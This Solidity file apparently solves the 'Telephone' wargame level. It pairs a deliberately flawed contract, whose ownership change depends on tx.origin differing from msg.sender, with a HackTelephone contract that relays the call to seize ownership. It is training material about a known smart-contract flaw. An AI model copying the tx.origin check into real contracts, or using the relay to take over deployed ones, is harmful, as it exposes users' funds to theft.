// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        // tx.origin - the one who initiated the tx
        // msg.sender - the one who calls the function
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract HackTelephone {
    Telephone telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
    }

    function changeOwner(address _owner) external {
        telephone.changeOwner(_owner);
    }
}
